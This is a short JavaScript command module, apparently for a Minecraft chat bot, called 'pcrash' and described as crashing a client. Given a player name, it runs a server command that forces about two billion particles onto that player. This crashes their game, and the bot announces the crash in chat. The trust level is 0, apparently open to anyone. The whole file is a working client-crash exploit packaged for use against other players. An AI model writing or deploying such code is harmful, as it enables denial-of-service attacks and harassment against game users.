module.exports = {
  chat (handler) {
    const player = handler.args.join(' ')

    handler.tellraw(`${player} was crashed by ${handler.bot.username} using pcrash`)
    handler.core.run(`execute as ${handler.util.selectUsername(player)} at @s run particle dust_color_transition 1 0 0 2 0 1 0 ~ ~1.5 ~ .1 .1 .1 0 2147483646 force @s`)
  },
  name: 'pcrash',
  description: 'Crashes a client.',
  usage: 'pcrash <player>',
  trust: 0,
  enabled: true
}
